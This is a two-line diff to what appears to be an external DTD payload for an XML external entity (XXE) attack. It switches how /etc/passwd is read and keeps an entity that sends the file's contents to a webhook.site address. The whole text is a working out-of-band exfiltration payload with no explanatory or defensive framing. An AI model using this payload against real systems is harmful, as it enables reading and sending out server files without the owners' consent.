@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % file SYSTEM "file://etc/passwd">
 <!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/77e116e7-2c81-44de-8c44-c9554a5c22d1/?exfil=%file;'>"> %all; 
